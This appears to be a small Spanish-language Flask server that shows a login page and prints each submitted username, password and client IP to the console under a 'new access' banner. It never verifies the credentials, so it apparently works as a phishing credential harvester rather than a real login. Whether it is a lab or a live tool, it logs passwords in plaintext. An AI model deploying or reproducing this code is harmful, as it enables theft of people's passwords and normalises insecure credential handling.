from flask import Flask, render_template, request

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def login():

    if request.method == "POST":

        usuario = request.form["usuario"]
        clave = request.form["clave"]

        ip = request.remote_addr

        print("======== NUEVO ACCESO ========")
        print(f"IP: {ip}")
        print(f"Usuario: {usuario}")
        print(f"Clave: {clave}")
        print("================================")

        return render_template("index.html")

    return render_template("login.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)